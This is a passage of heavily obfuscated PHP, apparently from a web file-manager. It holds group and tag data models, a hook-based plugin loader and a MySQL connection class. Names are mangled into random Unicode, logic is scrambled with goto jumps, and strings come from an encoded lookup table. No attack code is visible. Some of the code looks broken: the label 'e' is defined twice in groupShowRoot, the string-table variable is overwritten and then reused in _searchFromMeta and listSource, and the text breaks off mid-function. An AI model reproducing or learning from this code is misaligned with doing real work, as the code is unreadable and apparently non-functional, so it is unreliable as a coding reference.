unset($fԹ[$cϧֽ[1771]]); unset($fԹ[$cϧֽ[1772]]); } goto d؂; d؂: if (isset($fԹ[$cϧֽ[28]]) && $fԹ[$cϧֽ[28]] != $Aɉ[$cϧֽ[28]]) { $this->_clearChildrenCache($Aɉ); } return $this->where(array($cϧֽ[1773] => $fӿ))->save($fԹ); goto D; e򥄟: $cϧֽ =& $_SERVER[̉]; $Aɉ = $this->getInfoSimple($fӿ); if (!$Aɉ) { return !1; } goto fϚ; D: } private function _clearChildrenCache($cӣ) { $a¦ߵ =& $_SERVER[̉]; $B = array($a¦ߵ[553] => array($a¦ߵ[512], $cӣ[$a¦ߵ[487]] . $cӣ[$a¦ߵ[1695]] . $a¦ߵ[513])); $fǓ = $this->field($a¦ߵ[1695])->where($B)->select(); foreach ($fǓ as $D󅟺) { $this->cacheFunctionClear($a¦ߵ[1774], $D󅟺[$a¦ߵ[1695]]); $this->cacheFunctionClear($a¦ߵ[1768], $D󅟺[$a¦ߵ[1695]]); } } private function _changeChildLevel($d, $D, $Fڂ = false) { goto CƼ; CƼ: $D★ =& $_SERVER[̉]; $c = $d[$D★[487]] . $d[$D★[1695]] . $D★[47]; $Bѣ = $D[$D★[487]] . $D[$D★[1695]] . $D★[47] . $d[$D★[1695]] . $D★[47]; goto aϦ; aϦ: if ($Fڂ) { $Bѣ = $D[$D★[487]] . $D[$D★[1695]] . $D★[47]; } $eï = array($D★[553] => array($D★[512], $d[$D★[487]] . $d[$D★[1695]] . $D★[513])); $Dз = array($D★[553] => array($D★[561], "\x72\x65\x70\x6c\x61\143\145\x28\160\x61\162\x65\156\x74\x4c\x65\166\145\x6c\54\x27{$c}\x27\x2c\x27{$Bѣ}\x27\x29")); goto f珜; f珜: $this->_clearChildrenCache($d); $this->where($eï)->data($Dз)->save(); goto cު; cު: } public function setNamePinyin($f, $Cʂ = false) { $b =& $_SERVER[̉]; if (!$Cʂ) { $eǸ = $this->getInfoSimple($f); $Cʂ = $eǸ[$b[28]]; } if (!Input::check($Cʂ, $b[556])) { $this->metaSet($f, $b[444], null); $this->metaSet($f, $b[443], null); return; } $A = array($b[444] => str_replace($b[50], $b[33], Pinyin::encode($Cʂ)), $b[443] => Pinyin::encode($Cʂ, $b[557])); $this->metaSet($f, $A); } protected function groupStatus($DѰ, $EŽճ) { goto Dؐ; E˟ֆ: if ($EŽճ == $Bܢ[87]) { $fފ = $this->parentLevelArray($e㠽[$Bܢ[487]]); } else { $c = array($Bܢ[553] => array($Bܢ[512], $e㠽[$Bܢ[487]] . $e㠽[$Bܢ[1695]] . $Bܢ[513])); $fފ = $this->where($c)->field($Bܢ[1695])->select(); $fފ = array_to_keyvalue($fފ, $Bܢ[33], $Bܢ[1695]); } $fފ[] = $e㠽[$Bܢ[1695]]; $E󖯲 = array(); goto B鐊; Dؐ: $Bܢ =& $_SERVER[̉]; $e㠽 = $this->getInfoSimple($DѰ); if (!$e㠽) { return !1; } goto E˟ֆ; B鐊: foreach ($fފ as $DѰ) { $E󖯲[] = array($Bܢ[1695] => $DѰ, $Bܢ[93] => $Bܢ[713], $Bܢ[372] => $EŽճ); } return Model($Bܢ[1775])->addAll($E󖯲, array(), !0); goto dƻѤ˪; dƻѤ˪: } protected function groupRemove($bΣڛ) { goto Dϐ; d΋: if (!$c򪭖 || $c򪭖[$C䎑[478]] == 0) { return !1; } $a = $this->getInfoSimple($c򪭖[$C䎑[478]]); $this->_changeChildLevel($c򪭖, $a, !0); goto c瞔; c瞔: $this->where(array($C䎑[478] => $bΣڛ))->save(array($C䎑[478] => $c򪭖[$C䎑[478]])); Model($C䎑[1775])->where($c)->delete(); Model($C䎑[1776])->where($c)->delete(); goto BĤ; BĤ: Model($C䎑[793])->groupRootRemove($bΣڛ); return $this->where($c)->delete(); goto b; Dϐ: $C䎑 =& $_SERVER[̉]; $c = array($C䎑[1695] => $bΣڛ); $c򪭖 = $this->where($c)->find(); goto d΋; b: } protected function groupSort($d̤) { $e떈 =& $_SERVER[̉]; $eփ = array(); foreach ($d̤ as $dˋ => $bɕվ) { $eփ[] = array($e떈[1695], $bɕվ, $e떈[1718], $dˋ + 1); } $this->saveAll($eփ); } public function listData() { $b = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b[$_SERVER[̉][367]]); return $b; } private function _makeOrder($B = '') { goto BԾ; FɢѾ: $B = $B . "{$c񌃇}\40{$b}\54\x20\147\162\x6f\x75\160\111\x44\40\141\x73\143"; return $this->order($B); goto bҼ; d: $c񌃇 = Input::get($E[435], $E[7], $E[1699], $a); $b = Input::get($E[436], $E[7], $E[1777], array($E[1777], $E[430])); $b = $aɧ[$b]; goto FɢѾ; BԾ: $E =& $_SERVER[̉]; $a = array($E[1695], $E[28], $E[1681], $E[194]); $aɧ = array($E[428] => $E[429], $E[430] => $E[431]); goto d; bҼ: } public function listChild($F͹膮) { $E =& $_SERVER[̉]; $AҌ = $this->where(array($E[478] => $F͹膮))->_makeOrder()->selectPage(200); $this->_listDataApply($AҌ[$E[367]]); return $AҌ; } public function listByID($b폎׈) { $Aͽؾ =& $_SERVER[̉]; if (!$b폎׈) { return array(); } $f = array($Aͽؾ[1695] => array($Aͽؾ[7], $b폎׈)); $dߖ = $this->where($f)->select(); $this->_listDataApply($dߖ); return $dߖ; } public function listSearch($eۻ) { goto dѐ; C: if (!trim($AƵ͠)) { return !1; } $AƵ͠ = str_replace($Eᐆ[1780], $Eᐆ[1781], $AƵ͠); $A = array($Eᐆ[1695] => array($Eᐆ[380], "{$AƵ͠}\45"), $Eᐆ[28] => array($Eᐆ[380], "\45{$AƵ͠}\45"), $Eᐆ[956] => $Eᐆ[1782]); goto D; dѐ: $Eᐆ =& $_SERVER[̉]; $AƵ͠ = $eۻ[$Eᐆ[1778]]; $c㲭 = isset($eۻ[$Eᐆ[1779]]) ? $eۻ[$Eᐆ[1779]] : !1; goto C; eΧғ: $d̕ = $d̕ ? $d̕ : array($Eᐆ[367] => array(), $Eᐆ[364] => array()); if (!$d̕ || count($d̕[$Eᐆ[367]]) < 5 && Input::check($AƵ͠, $Eᐆ[316])) { goto e͍Ҝ; B: $d̕[$Eᐆ[364]][$Eᐆ[366]] = ceil($d̕[$Eᐆ[364]][$Eᐆ[365]] / $d̕[$Eᐆ[364]][$Eᐆ[361]]); goto CƖ; Fƥ: $d΂ = array_merge($E, $d, $d̕[$Eᐆ[367]]); $d̕[$Eᐆ[367]] = array_unique_by_key($d΂, $Eᐆ[1695]); $d̕[$Eᐆ[364]][$Eᐆ[365]] = count($d̕[$Eᐆ[367]]); goto B; e͍Ҝ: $B֖ = $this->groupChildrenAll($c㲭); $E = $this->_searchFromMeta($Eᐆ[443], $AƵ͠, 10, $B֖); $d = $this->_searchFromMeta($Eᐆ[444], $AƵ͠, 10, $B֖); goto Fƥ; CƖ: } $this->_listDataApply($d̕[$Eᐆ[367]]); goto F; D: if ($c㲭) { $fߋ = $this->getInfoSimple($c㲭); $Aয׫ = $fߋ[$Eᐆ[487]] . $c㲭 . $Eᐆ[513]; $A = array($A, array($Eᐆ[487] => array($Eᐆ[380], $Aয׫))); } $A = $this->parseWhereLike($A); $d̕ = $this->_makeOrder()->where($A)->selectPage(20); goto eΧғ; F: return $d̕; goto FĪŴ; FĪŴ: } protected function groupChildrenAll($fՠ) { $D =& $_SERVER[̉]; if (!$fՠ) { return !1; } if (is_string($fՠ)) { $fՠ = array($fՠ); } $aýʻ = $fՠ; foreach ($fՠ as $f) { $a⡆ = $this->getInfoSimple($f); $Aݽմ = array($D[487] => array($D[380], $a⡆[$D[487]] . $f . $D[513])); $Bֈ = $this->field($D[1695])->where($Aݽմ)->select(); $aýʻ = array_merge($aýʻ, array_to_keyvalue($Bֈ, $D[33], $D[1695])); } return array_unique($aýʻ); } private function _searchFromMeta($Eߑ, $dښ͞, $C, $eş) { goto aæ; e: $Cٳי = $this->parseWhereLike($Cٳי); if ($eş) { $Cٳי[$b[1695]] = array($b[7], $eş); } $b = Model($b[1783])->where($Cٳי)->limit($C)->select(); goto fԍے; Dшب: if (!$bץ) { return array(); } return $bץ; goto F͐; fԍے: if (!$b) { return array(); } $b = array_to_keyvalue($b, $b[33], $b[1695]); $bץ = $this->where(array($b[1773] => array($b[7], $b)))->select(); goto Dшب; aæ: $b =& $_SERVER[̉]; $dښ͞ = strtolower($dښ͞); $Cٳי = array($b[93] => $Eߑ, $b[372] => array($b[380], "\x25{$dښ͞}\45")); goto e; F͐: } protected function _listDataApplyItem($B͙) { $CÔ = array($B͙); $this->_listDataApply($CÔ); return $CÔ[0]; } protected function _listDataApply(&$fچ) { goto eӜ; D: $this->_listAppendChildren($fچ); $this->_listAppendChildrenMember($fچ); $this->_listAppendMeta($fچ, $a팋Ў); goto DԂ; DԂ: $this->_listAppendParent($fچ); $this->_listAppendSourceRoot($fچ, $a팋Ў); goto d曜; eӜ: $e =& $_SERVER[̉]; if (!$fچ) { return; } $a팋Ў = array_to_keyvalue($fچ, $e[33], $e[1695]); goto D; d曜: } private function _listAppendChildren(&$b) { goto b; bնɈ랴: $FՌة = array($fξ[478], $fξ[1784] => $fξ[480]); $Aߍ° = $this->field($FՌة)->where($DݫѰ)->group($fξ[478])->select(); $eڑՕ = array_to_keyvalue($Aߍ°, $fξ[478], $fξ[480]); goto C; b: $fξ =& $_SERVER[̉]; $aהТ = array_to_keyvalue($b, $fξ[33], $fξ[1695]); $DݫѰ = array($fξ[478] => array($fξ[7], $aהТ)); goto bնɈ랴; C: foreach ($b as &$F) { $aʊ = $F[$fξ[1695]]; $F[$fξ[1785]] = isset($eڑՕ[$aʊ]) ? intval($eڑՕ[$aʊ]) : !1; } unset($F); goto d; d: } private function _listAppendChildrenMember(&$Aˢݹ) { goto B; B: $cԈ =& $_SERVER[̉]; $b´姃 = array_to_keyvalue($Aˢݹ, $cԈ[33], $cԈ[1695]); $D󐇴ꄋ = array($cԈ[1695] => array($cԈ[7], $b´姃)); goto EӃ; e􉌰: foreach ($Aˢݹ as &$F) { $aꏈ = $F[$cԈ[1695]]; $F[$cԈ[1786]] = isset($D[$aꏈ]) ? intval($D[$aꏈ]) : !1; } unset($F); goto aއ; EӃ: $fřք = array($cԈ[1695], $cԈ[1784] => $cԈ[480]); $C = Model($cԈ[1776])->field($fřք)->where($D󐇴ꄋ)->group($cԈ[1695])->select(); $D = array_to_keyvalue($C, $cԈ[1695], $cԈ[480]); goto e􉌰; aއ: } private function _listAppendMeta(&$c숻, $b) { goto cԖ; f: foreach ($c숻 as &$d) { $d[$C[445]] = array(); if (isset($cɌ[$d[$C[1695]]])) { $d[$C[445]] = $cɌ[$d[$C[1695]]]; } } unset($d); goto bʯ; Fٽ: $cɌ = array_to_keyvalue_group($cɌ, $C[1695]); foreach ($cɌ as &$d) { $d = array_to_keyvalue($d, $C[93], $C[372]); } unset($d); goto f; cԖ: $C =& $_SERVER[̉]; $dͬ = array($C[1695] => array($C[7], $b)); $cɌ = Model($C[1775])->where($dͬ)->select(); goto Fٽ; bʯ: } protected function parentLevelArray($a) { $B =& $_SERVER[̉]; $a = explode($B[47], trim($a, $B[47])); $a = array_remove_value($a, $B[191]); return $a; } private function _listAppendParent(&$f) { goto E൏; B: unset($E); foreach ($Aø as $f => $Cև) { if ($Cև) { continue; } $C赻 = $this->getInfoSimple($f); $Aø[$f] = $C赻[$D[28]]; } $e = $GLOBALS[$D[6]][$D[88]][$D[1787]]; goto eџ; E൏: $D =& $_SERVER[̉]; $Aø = array(); foreach ($f as &$E) { $Aø[$E[$D[1695]]] = $E[$D[28]]; $cܹ = $this->parentLevelArray($E[$D[487]]); foreach ($cܹ as $b) { if (!isset($Aø[$b])) { $Aø[$b] = 0; } } } goto B; eџ: if ($GLOBALS[$D[485]] == $D[87]) { $e = !1; } foreach ($f as &$E) { $cܹ = $this->parentLevelArray($E[$D[487]]); $Aф = $D[33]; foreach ($cܹ as $f => $b) { if ($e && $f == 0) { continue; } $Aф .= $Aø[$b] . $D[8]; } if ($cܹ) { $Aф .= $E[$D[28]]; } $E[$D[491]] = str_replace($D[496], $D[8], $Aф); } unset($E); goto CȰ; CȰ: } private function _listAppendSourceRoot(&$eө, $cȢ) { goto A̋; A̋: $EǨȂ =& $_SERVER[̉]; $B = array($EǨȂ[404] => SourceModel::TYPE_GROUP, $EǨȂ[478] => 0, $EǨȂ[484] => array($EǨȂ[7], $cȢ)); $Cɧ = $EǨȂ[1788]; goto e; e: $bÍ = Model($EǨȂ[793])->order($EǨȂ[1789])->field($Cɧ)->where($B)->select(); $bÍ = array_to_keyvalue($bÍ, $EǨȂ[484]); $bÍ = array_remove_key($bÍ, $EǨȂ[484]); goto cԍ; cԍ: foreach ($eө as &$Cɑ) { $Cɑ[$EǨȂ[85]] = $bÍ[$Cɑ[$EǨȂ[1695]]] ? $bÍ[$Cɑ[$EǨȂ[1695]]] : array(); } unset($Cɑ); goto B󿨩; B󿨩: } protected function groupMerge($e͠) { $e͠ = array_values(array_unique($e͠)); $aٯ = array(); for ($fҤ圐 = 0; $fҤ圐 < count($e͠); $fҤ圐++) { $eٛ = !1; for ($A̅ = 0; $A̅ < count($e͠); $A̅++) { if ($fҤ圐 == $A̅) { continue; } if ($this->isParentOf($e͠[$A̅], $e͠[$fҤ圐])) { $eٛ = !0; break; } } if (!$eٛ) { $aٯ[] = $e͠[$fҤ圐]; } } return $aٯ; } protected function isParentOf($Cɺ, $E߳) { goto bֆ; b: return !1; goto d; aՙ: $dᆼ = $this->getInfoSimple($E߳); $Dݮ򈗴 = $AΒ[$bԋ[487]] . $Cɺ . $bԋ[47]; if (substr($dᆼ[$bԋ[487]], 0, strlen($Dݮ򈗴)) == $Dݮ򈗴) { return !0; } goto b; bֆ: $bԋ =& $_SERVER[̉]; if (!$Cɺ || !$E߳ || $Cɺ == $E߳) { return !1; } $AΒ = $this->getInfoSimple($Cɺ); goto aՙ; d: } public function groupShowRoot($f͓, $A = false) { goto E; fǡ: if ($A && count($bǹ) == 1) { return $a攖; } if (!$d룯ˊ[$Fˍ[445]] || !isset($d룯ˊ[$Fˍ[445]][$Fˍ[1771]]) || $d룯ˊ[$Fˍ[445]][$Fˍ[1771]] == $Fˍ[1745]) { return $this->groupShowRoot($bǹ[count($bǹ) - 1], $A); } if ($d룯ˊ[$Fˍ[445]][$Fˍ[1771]] == $Fˍ[357]) { $c = explode($Fˍ[47], $d룯ˊ[$Fˍ[445]][$Fˍ[1772]]); if ($c) { $a攖 = array_merge($a攖, $c); } } goto e; E: $Fˍ =& $_SERVER[̉]; $d룯ˊ = $this->getInfo($f͓); if (!$d룯ˊ) { return array(); } goto e; e: $bǹ = $this->parentLevelArray($d룯ˊ[$Fˍ[487]]); $a攖 = array($f͓); if (count($bǹ) == 0) { return $a攖; } goto fǡ; e: return $a攖; goto dґ; dґ: } protected function resetParentLevel() { $FƂ =& $_SERVER[̉]; $c = $FƂ[1695]; $AӰӧ = $this->select(); $AӰӧ = array_to_keyvalue($AӰӧ, $c); foreach ($AӰӧ as $A̔ě) { goto E; E: $Fʕ = $A̔ě; $dټ = array(); while ($Fʕ[$FƂ[478]] != 0) { $dټ[] = $Fʕ[$FƂ[478]]; $Fʕ = $AӰӧ[$Fʕ[$FƂ[478]]]; } goto F; F: $dټ[] = 0; $dټ = $FƂ[47] . implode($FƂ[47], array_reverse($dټ)) . $FƂ[47]; $this->setNamePinyin($A̔ě[$c], $A̔ě[$FƂ[28]]); goto Eϝ; Eϝ: $this->where(array($c => $A̔ě[$c]))->save(array($FƂ[553] => $dټ)); goto D嗴; D嗴: } return $AӰӧ; } public function groupNameAuto($bʶ܅, $aҐ˛) { $A̺ =& $_SERVER[̉]; $d˲ķ = $this->where(array($A̺[394] => $bʶ܅))->getField($A̺[28], !0); if (!$d˲ķ || !in_array($aҐ˛, $d˲ķ)) { return $aҐ˛; } for ($E = 1; $E <= count($d˲ķ) + 1; $E++) { $bͲ = $aҐ˛ . "\50{$E}\51"; if (!in_array($bͲ, $d˲ķ)) { return $bͲ; } } } public function groupSwitch($dԊ̶, $bǳ燺) { goto cȑɶ; BȾ: $this->where(array($e͏[478] => $dԊ̶))->save(array($e͏[478] => $bǳ燺)); return !0; goto c߆; Eě: $Eڜ̴ = !empty($F[$dԊ̶]) ? $F[$dԊ̶] : !1; if ($Eڜ̴) { goto dȜԱ; dȜԱ: if (!$F[$bǳ燺]) { $F[$bǳ燺] = Model($e͏[793])->groupRootAdd($bǳ燺); } $b = $F[$bǳ燺]; $c̡ = array($e͏[478] => $Eڜ̴); goto d; B: foreach ($F as $EǤٱ) { $B = $EǤٱ[$e͏[403]] == $e͏[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($e͏[793])->move($EǤٱ[$e͏[395]], $b, $B); } Model($e͏[793])->moveClearAuth = !0; $c̡ = array($e͏[404] => 2, $e͏[484] => $dԊ̶); goto DβԨ; DβԨ: $C̆ = array($e͏[484] => $bǳ燺); Model($e͏[1793])->where($c̡)->save($C̆); Model($e͏[1794])->where($c̡)->save($C̆); goto Fؔ؃; d: $F = Model($e͏[793])->where($c̡)->field($e͏[1792])->select(); if (!$F) { $F = array(); } Model($e͏[793])->moveClearAuth = !1; goto B; Fؔ؃: } $this->_changeChildLevel($CӇ񒺞[$dԊ̶], $CӇ񒺞[$bǳ燺], !0); goto BȾ; F: $cƬ = Model($e͏[1776])->where($c̡)->select(); if (!$cƬ) { $cƬ = array(); } foreach ($cƬ as $d) { $b = $d[$e͏[1531]]; $c̡ = array($e͏[1531] => $b, $e͏[1695] => $bǳ燺); $aҢ = Model($e͏[1776])->where($c̡)->find(); if (!$aҢ) { $dӚ = array($bǳ燺 => $d[$e͏[1790]]); Model($e͏[506])->userGroupAdd($b, $dӚ); } Model($e͏[506])->userGroupRemove($b, $dԊ̶); } goto e; e: $c̡ = array($e͏[404] => 2, $e͏[478] => 0, $e͏[403] => 1, $e͏[484] => array($e͏[7], array($dԊ̶, $bǳ燺))); $F = Model($e͏[793])->where($c̡)->field($e͏[1791])->select(); $F = array_to_keyvalue($F, $e͏[484], $e͏[395]); goto Eě; CȋȺ: $CӇ񒺞 = array_to_keyvalue($CӇ񒺞, $e͏[1695]); if (!isset($CӇ񒺞[$dԊ̶]) || !isset($CӇ񒺞[$bǳ燺]) || $CӇ񒺞[$dԊ̶][$e͏[478]] == 0) { return !1; } $c̡ = array($e͏[1695] => $dԊ̶); goto F; cȑɶ: $e͏ =& $_SERVER[̉]; $c̡ = array($e͏[1695] => array($e͏[7], array($dԊ̶, $bǳ燺))); $CӇ񒺞 = $this->where($c̡)->select(); goto CȋȺ; c߆: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\137\x66\141\166"; protected function cacheFunctionAlias($A) { $c =& $_SERVER[̉]; return array($c[1795] => array($A[0], $c[1796]), $c[1797] => array($A[0], $c[1798])); } protected function get($f݌ޫ) { $bڥ =& $_SERVER[̉]; $aݞ = Model($bڥ[486])->metaGet($f݌ޫ, $bڥ[1799]); $a٭ = json_decode($aݞ, !0); return $a٭ ? $a٭ : array($bڥ[1800] => $bڥ[87], $bڥ[367] => array()); } protected function set($a؄, $D䑆) { $D =& $_SERVER[̉]; $D䑆 = $D䑆 ? $D䑆 : array($D[1800] => $D[87], $D[367] => array()); Model($D[486])->metaSet($a؄, $D[1799], json_encode($D䑆)); return Model($D[486])->metaSet($a؄, $D[1799], json_encode($D䑆)); } protected function getByTagID($d, $cԮ) { goto a̢; aچ: $a = $this->get($d); if (!$a || !isset($a[$c˰[367]])) { return !1; } $c݃犺 = array_find_by_field($a[$c˰[367]], $c˰[393], $cԮ); goto DȜ̏; a̢: $c˰ =& $_SERVER[̉]; if (!$d || !$cԮ) { return !1; } if (!Model($c˰[486])->getInfoSimple($d)) { return !1; } goto aچ; DȜ̏: return is_array($c݃犺) ? $c݃犺 : !1; goto e񒔱; e񒔱: } public function listSource($D, $D󸪝) { goto E; E: $B =& $_SERVER[̉]; if ($D󸪝 && !is_array($D󸪝)) { $D󸪝 = array($D󸪝); } $B = $this->listData($D); goto B; f鏙: foreach ($F as $c) { if (!in_array($c, $e鋂)) { $e[] = $c; } } if ($e) { $this->removeBySource($D, $e); } return $Fޛ; goto Dڳֈ; B: $f = array(); foreach ($B as $D릒) { $c = $D릒[$B[76]]; if (!$c) { continue; } if (!isset($f[$c])) { $f[$c] = array(); } $f[$c][] = $D릒[$B[419]]; } $F = array(); goto F̻; F̻: foreach ($f as $C؍ʌ => $c) { $C = !0; if (!$D󸪝) { $F[] = $C؍ʌ; continue; } foreach ($D󸪝 as $c۴) { if (!in_array($c۴, $c)) { $C = !1; break; } } if ($C) { $F[] = $C؍ʌ; } } if (!$F) { return array(); } $f = array($B[410] => array($B[411], $F), $B[484] => $D, $B[404] => SourceModel::TYPE_GROUP); goto f; Cؑ: $B⍂ = array_to_keyvalue($Fޛ[$B[75]], $B[33], $B[395]); $Bۆݪ = array_to_keyvalue($Fޛ[$B[74]], $B[33], $B[395]); $e鋂 = array_merge($Bۆݪ, $B⍂); goto f鏙; f: $Fޛ = Model($B[1205])->listSource($f); if (!$Fޛ || count($F) == $Fޛ[$B[364]][$B[365]]) { return $Fޛ; } $e = array(); goto Cؑ; Dڳֈ: } protected function listData($b񞓷) { $b̍ =& $_SERVER[̉]; $BԄ = array($b̍[1523] => 0, $b̍[463] => array($b̍[1801], 0), $b̍[415] => $b̍[1802] . $b񞓷); $D = $b̍[1803]; $a = $this->field($D)->where($BԄ)->order($b̍[1804])->select(); return $a ? $a : array(); } protected function addToTag($A֋, $EΆ, $bּ) { $D͹ =& $_SERVER[̉]; if (!$this->getByTagID($A֋, $bּ) || !$EΆ) { return !1; } if (!Model($D͹[793])->pathInfo($EΆ)) { return !1; } $c = array($D͹[1523] => 0, $D͹[463] => $bּ, $D͹[414] => $EΆ, $D͹[415] => $D͹[1805] . $A֋, $D͹[413] => $D͹[33], $D͹[1699] => 0); if ($this->where($c)->find()) { return !1; } return $this->add($c); } protected function removeFromTag($DϨ, $Dͧ, $C튄) { $B̈́ =& $_SERVER[̉]; if (!$this->getByTagID($DϨ, $C튄) || !$Dͧ) { return !1; } if (is_array($Dͧ)) { $Dͧ = array($B̈́[7], $Dͧ); } $F̻ = array($B̈́[1523] => 0, $B̈́[463] => $C튄, $B̈́[415] => $B̈́[1805] . $DϨ, $B̈́[414] => $Dͧ); return $this->where($F̻)->delete(); } protected function removeByTag($f烇, $A) { $BԆϰ =& $_SERVER[̉]; if (!$this->getByTagID($f烇, $A)) { return !1; } $aÍ = array($BԆϰ[1523] => 0, $BԆϰ[463] => $A, $BԆϰ[415] => $BԆϰ[1805] . $f烇); return $this->where($aÍ)->delete(); } protected function removeBySource($dԇ, $Bևú) { $f =& $_SERVER[̉]; if (!$dԇ || !$Bևú) { return !1; } if (is_array($Bևú)) { $Bևú = array($f[7], $Bևú); } $B = array($f[1523] => 0, $f[414] => $Bևú, $f[463] => array($f[970], 0), $f[415] => $f[1805] . $dԇ); return $this->where($B)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\160\154\165\x67\x69\156\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\164\141\164\x75\x73", "\x72\145\147\x69\145\x73\164", "\143\157\x6e\146\151\147"); public function loadList($Aԉ = false) { $d۝ = array_to_keyvalue($this->listData(), $_SERVER[̉][28]); if ($Aԉ) { return $d۝[$Aԉ]; } return $d۝; } public function init() { $F =& $_SERVER[̉]; Hook::trigger($F[1806]); $b䶸ُ = $this->loadPluginList(); foreach ($b䶸ُ as $E҇ => $DΥ) { $d = $this->appAllow($E҇, $DΥ); if (!$d) { continue; } foreach ($DΥ[$F[1807]] as $b铎Ǟ => $bȑ) { Hook::bind($b铎Ǟ, $bȑ); } } Hook::trigger($F[1808]); Hook::trigger(ACTION); } public function appAllow($bŉ岟, $eդ, $dޟ = true) { $bл =& $_SERVER[̉]; $eх = PLUGIN_DIR . $bŉ岟 . $bл[1809]; if (!is_array($eդ) || !is_array($eդ[$bл[1807]]) || $eդ[$bл[713]] != 1 || !is_file($eх)) { return !1; } if ($GLOBALS[$bл[485]] == 1) { return !0; } if ($dޟ && !Action($bл[1810])->checkAuth($bŉ岟)) { return !1; } return !0; } public function unInstall($c) { $A궜 =& $_SERVER[̉]; $C떜 = $this->loadList($c); if (file_exists(PLUGIN_DIR . $c)) { Hook::apply($c . $A궜[1811]); } $this->remove($C떜[$A궜[393]]); } public function changeStatus($dډ, $BףЛ) { $e܆ =& $_SERVER[̉]; $B = $this->loadList($dډ); if ($BףЛ) { Hook::apply($dډ . $e܆[1812]); } $this->update($B[$e܆[393]], array($e܆[1813] => $BףЛ)); } public function appRegist($EވΕ, $e) { $fƳ =& $_SERVER[̉]; $c׏윊 = $this->loadList($EވΕ); if ($c׏윊) { $this->update($c׏윊[$fƳ[393]], array($fƳ[1807] => $e)); } else { $a = array($fƳ[28] => $EވΕ, $fƳ[1807] => $e, $fƳ[713] => 0, $fƳ[6] => $this->getConfigDefault($EވΕ)); $this->insert($a); } } public function getConfigDefault($B㍂) { $AÎ =& $_SERVER[̉]; $D = array(); $B = $this->getPackageJson($B㍂); if (!$B && is_array($B[$AÎ[1814]])) { return $D; } foreach ($B[$AÎ[1814]] as $B => $D剃) { if (!isset($D剃[$AÎ[372]]) || isset($D[$B])) { continue; } $D[$B] = $D剃[$AÎ[372]]; } return $D; } public function getPackageJson($Fӕ) { return Hook::apply($Fӕ . $_SERVER[̉][1815]); } public function getConfig($C떈, $eৗ = false) { $DՍ =& $_SERVER[̉]; $d׺ = array(); $e = $this->loadList($C떈); if ($e && is_array($e[$DՍ[6]])) { $d׺ = $e[$DՍ[6]]; } if (!$d׺ || $eৗ) { $d׺ = $this->getConfigDefault($C떈); } return $d׺; } public function setConfig($eۆȚ, $Eƒ = false) { goto eȌ; c: $this->update($Eׯ[$d׿[393]], array($d׿[6] => $Cߘ)); goto aӊ; fԹ: $Cߘ = $Eׯ[$d׿[6]]; if ($Eƒ == !1) { $Cߘ = array(); $Eƒ = $this->getConfigDefault($eۆȚ); } foreach ($Eƒ as $Bߟ => $E햊) { $Cߘ[$Bߟ] = is_string($E햊) ? trim($E햊) : $E햊; } goto c; eȌ: $d׿ =& $_SERVER[̉]; $Eׯ = $this->loadList($eۆȚ); if (!$Eׯ) { return !1; } goto fԹ; aӊ: } public function viewList() { goto a; aٚݽ: $Fɝ = $this->loadPluginList(); $eź = array(); foreach ($Fɝ as $F䌮 => $B˃) { unset($B˃[$f[1807]], $B˃[$f[6]]); $CĂ = PLUGIN_DIR . $B˃[$f[28]] . $f[1809]; if (!is_file($CĂ)) { continue; } $b׷ = Hook::apply($B˃[$f[28]] . $f[1815]); if (is_array($b׷)) { $eź[$F䌮] = array_merge($B˃, $b׷); } } goto AĹ; AĹ: return $eź; goto f܈Ǡ; a: $f =& $_SERVER[̉]; $Fɝ = $this->loadList(); $this->pluginScan($Fɝ); goto aٚݽ; f܈Ǡ: } private function loadPluginList() { $c⷏ =& $_SERVER[̉]; $c׸ô = $this->loadList(); if (strtolower(MOD) == $c⷏[1816]) { return $c׸ô; } $cޕ͐ = Hook::trigger($c⷏[1817], $c׸ô); if ($c׸ô && !$cޕ͐) { die; } return $cޕ͐ ? $cޕ͐ : $c׸ô; } private function pluginScan($A) { $E钊 =& $_SERVER[̉]; recursion_dir(PLUGIN_DIR, $dܐ, $e孶Ą, 0); foreach ($dܐ as $DӃ) { $eŕ = get_path_this($DӃ); if (isset($A[$eŕ]) || !file_exists($DӃ . $E钊[1818]) || !file_exists($DӃ . $E钊[1809])) { continue; } Hook::apply($eŕ . $E钊[1812]); } } } goto d; a: class DbMysql extends Db { public function __construct($fކ = '') { $a =& $_SERVER[̉]; if (!extension_loaded($a[762])) { think_exception(think_lang($a[10]) . $a[844]); } if (!empty($fކ)) { $this->config = $fކ; if (empty($this->config[$a[13]])) { $this->config[$a[13]] = $a[33]; } } } public function connect($Dֿ׏ = '', $C隲 = 0, $E = false) { $aˢ挅 =& $_SERVER[̉]; if (!isset($this->linkID[$C隲])) { goto D; A؊: if (1 != think_config($aˢ挅[18])) { unset($this->config); } goto C; D: if (empty($Dֿ׏)) { $Dֿ׏ = $this->config; } $BЋգ = $Dֿ׏[$aˢ挅[845]] . ($Dֿ׏[$aˢ挅[846]] ? "\72{$Dֿ׏[$aˢ挅[846]]}" : $aˢ挅[33]); $c = !empty($Dֿ׏[$aˢ挅[13]][$aˢ挅[14]]) ? $Dֿ׏[$aˢ挅[13]][$aˢ挅[14]] : $this->pconnect; goto A; A跃: mysql_query($aˢ挅[849] . think_config($aˢ挅[850]) . $aˢ挅[55], $this->linkID[$C隲]); if ($A > $aˢ挅[851]) { mysql_query($aˢ挅[852], $this->linkID[$C隲]); } $this->connected = !0; goto A؊; A: if ($c) { $this->linkID[$C隲] = mysql_pconnect($BЋգ, $Dֿ׏[$aˢ挅[847]], $Dֿ׏[$aˢ挅[848]], 131072); } else { $this->linkID[$C隲] = mysql_connect($BЋգ, $Dֿ׏[$aˢ挅[847]], $Dֿ׏[$aˢ挅[848]], !0, 131072); } if (!$this->linkID[$C隲] || !empty($Dֿ׏[$aˢ挅[17]]) && !mysql_select_db($Dֿ׏[$aˢ挅[17]], $this->linkID[$C隲])) { think_exception(mysql_error()); } $A = mysql_get_server_info($this->linkID[$C隲]); goto A跃; C: } return $this->linkID[$C隲]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($d) { goto f㟣; D: think_action_status($FÖ[19], 1); think_status($FÖ[20]); $this->queryID = mysql_query($d, $this->_linkID); goto f̈; bԈ: if (!$this->_linkID) { return !1; } $this->queryStr = $d; if ($this->queryID) { $this->free(); } goto D; f㟣: 